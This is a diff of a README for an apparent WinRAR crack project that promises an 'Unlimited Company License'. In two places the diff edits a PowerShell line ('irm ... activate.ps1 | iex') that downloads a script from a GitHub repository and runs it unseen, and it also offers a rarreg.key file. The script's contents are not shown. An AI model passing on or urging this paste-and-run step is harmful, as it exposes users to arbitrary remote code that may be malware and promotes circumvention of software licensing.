@@ -11,7 +11,7 @@
 Open **PowerShell** (Windows + X -> Terminal / PowerShell) and paste the following command:
 
 ```powershell
-irm https://raw.githubusercontent.com/dat1799/DTrix-Winrar-License/main/activate.ps1 | iex
+irm https://raw.githubusercontent.com/dat1799/DTrix-Winrar-License-Releases/main/activate.ps1 | iex
 ```
 
 Or [download the rarreg.key file directly](rarreg.key) and copy it manually.
@@ -36,7 +36,7 @@ WinRAR's evaluation pop-up is a familiar nuisance. This project helps you perman
 1. Press `Windows key` and search for `PowerShell`.
 2. Paste and run:
    ```powershell
-   irm https://raw.githubusercontent.com/dat1799/DTrix-Winrar-License/main/activate.ps1 | iex
+   irm https://raw.githubusercontent.com/dat1799/DTrix-Winrar-License-Releases/main/activate.ps1 | iex
    ```
 3. Open WinRAR -> Click **Help** -> **About WinRAR** to verify your **Unlimited Company License**.
 
